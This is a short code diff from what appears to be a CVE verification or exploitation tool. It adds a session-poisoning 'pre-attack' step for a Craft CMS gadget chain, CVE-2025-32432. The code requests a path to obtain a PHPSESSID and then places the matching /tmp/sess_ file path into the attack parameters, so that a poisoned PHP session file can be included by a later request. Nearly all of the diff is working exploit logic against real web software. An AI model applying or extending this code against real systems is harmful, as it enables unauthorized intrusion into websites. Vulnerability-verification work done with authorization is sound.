@@ -392,6 +392,25 @@ def verify_craft_web_cve(
                 except Exception:
                     pass
 
+            # Session-poisoning pre-attack for gadget chains (e.g. CVE-2025-32432 PhpManager).
+            # If parameters contains "{pre_attack_path}" key, perform a GET to that path first.
+            # The PHPSESSID from Set-Cookie is extracted and {session_file} placeholders in
+            # all parameter values are replaced with /tmp/sess_{PHPSESSID}.
+            if isinstance(parameters, dict) and "{pre_attack_path}" in parameters:
+                _pre_path = parameters.pop("{pre_attack_path}")
+                try:
+                    _pre_r = _http_request("GET", base_url + _pre_path, timeout=10)
+                    _sc_hdr = _pre_r.headers.get("set-cookie", "") or ""
+                    _sess_m = re.search(r"PHPSESSID=([a-f0-9]+)", _sc_hdr)
+                    if _sess_m:
+                        _sf = f"/tmp/sess_{_sess_m.group(1)}"
+                        step(f"  craftverify: sesión envenenada → {_sf}")
+                        import json as _jrepl
+                        _ps = _jrepl.dumps(parameters)
+                        parameters = _jrepl.loads(_ps.replace("{session_file}", _sf))
+                except Exception as _pre_e:
+                    step(f"  craftverify: pre-attack error — {_pre_e}")
+
             target_url = base_url + endpoint
             headers = {}
             if cookie:
